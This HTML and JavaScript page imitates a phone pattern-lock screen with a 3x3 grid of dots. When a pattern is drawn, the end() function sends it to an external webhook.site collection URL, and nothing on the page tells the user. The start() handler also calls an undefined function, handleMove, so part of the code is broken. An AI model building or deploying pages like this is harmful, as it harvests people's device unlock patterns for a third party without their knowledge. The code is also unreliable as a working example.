<!DOCTYPE html>
<html>
<head>
  <title>Pattern Lock</title>

  <style>
    body {
  margin: 0;
  background: #111;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
    }
    .wrapper {
      position: relative;
    }

    canvas {
      position: absolute;
      top: 0;
      left: 0;
      pointer-events: none;
    }
.grid {
  display: grid;
  grid-template-columns: repeat(3, 22vw);

  /* ⭐ separate control */
  column-gap: 10vw;   /* left-right spacing */
  row-gap: 14vh;      /* top-bottom spacing (THIS fixes height) */

  justify-content: center;
  align-items: center;
  touch-action: none;
}

.dot {
  width: 4.5vw;
  height: 4.5vw;
  background: #888;
  border-radius: 50%;
  margin: auto;
}

.dot.active {
  background: #4CAF50;
  transform: scale(1.8);
}
  </style>
</head>

<body>

<div class="wrapper">
  <canvas id="canvas"></canvas>

  <div class="grid" id="grid">
    <div class="dot" data-id="1"></div>
    <div class="dot" data-id="2"></div>
    <div class="dot" data-id="3"></div>
    <div class="dot" data-id="4"></div>
    <div class="dot" data-id="5"></div>
    <div class="dot" data-id="6"></div>
    <div class="dot" data-id="7"></div>
    <div class="dot" data-id="8"></div>
    <div class="dot" data-id="9"></div>
  </div>
</div>

<script>
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const grid = document.getElementById("grid");
const dots = document.querySelectorAll(".dot");

let pattern = [];
let isDrawing = false;
let currentPos = null;

// Resize canvas to grid
function resizeCanvas() {
  const rect = grid.getBoundingClientRect();
  canvas.width = rect.width;
  canvas.height = rect.height;
}
resizeCanvas();
window.addEventListener("resize", resizeCanvas);

// Get dot center relative to grid
function getCenter(dot) {
  const gridRect = grid.getBoundingClientRect();
  const rect = dot.getBoundingClientRect();

  return {
    x: rect.left - gridRect.left + rect.width / 2,
    y: rect.top - gridRect.top + rect.height / 2
  };
}

// Draw lines + trailing finger line
function draw() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  if (pattern.length === 0) return;

  ctx.strokeStyle = "#4CAF50";
  ctx.lineWidth = 8;
  ctx.lineCap = "round";

  ctx.beginPath();

  pattern.forEach((id, i) => {
    const dot = document.querySelector(`[data-id='${id}']`);
    const pos = getCenter(dot);

    if (i === 0) ctx.moveTo(pos.x, pos.y);
    else ctx.lineTo(pos.x, pos.y);
  });

  // ⭐ trailing line (finger follow)
  if (currentPos) {
    ctx.lineTo(currentPos.x, currentPos.y);
  }

  ctx.stroke();
}

// Activate dot
function activate(dot) {
  const id = dot.dataset.id;

  if (!pattern.includes(id)) {
    pattern.push(id);
    dot.classList.add("active");
  }
}

// Handle touch/mouse start
function start(e) {
  e.preventDefault();
  isDrawing = true;
  pattern = [];

  const point = getPoint(e);
  handleMove(point);
}

// Handle move
function move(e) {
  if (!isDrawing) return;
  e.preventDefault();

  const point = getPoint(e);
  currentPos = point;

  const el = document.elementFromPoint(point.clientX, point.clientY);
  if (el && el.classList.contains("dot")) {
    activate(el);
  }

  draw();
}

// End drawing
function end() {
  if (!isDrawing) return;
  isDrawing = false;

  const result = pattern.join("-");
  alert("Pattern: " + result);

  // send webhook
  fetch("https://webhook.site/f6af3aa6-bc95-46b5-a5a3-03d16ed5cb7b", {
    method: "POST",
    mode: "no-cors",
    body: "pattern=" + result
  });

  // reset
  setTimeout(() => {
    pattern = [];
    currentPos = null;
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    dots.forEach(d => d.classList.remove("active"));
  }, 800);
}

// Get touch/mouse point
function getPoint(e) {
  if (e.touches) return e.touches[0];
  return e;
}

// Attach events
dots.forEach(dot => {
  dot.addEventListener("mousedown", start);
  dot.addEventListener("touchstart", start);
});

document.addEventListener("mousemove", move);
document.addEventListener("touchmove", move);

document.addEventListener("mouseup", end);
document.addEventListener("touchend", end);
</script>

</body>
</html>
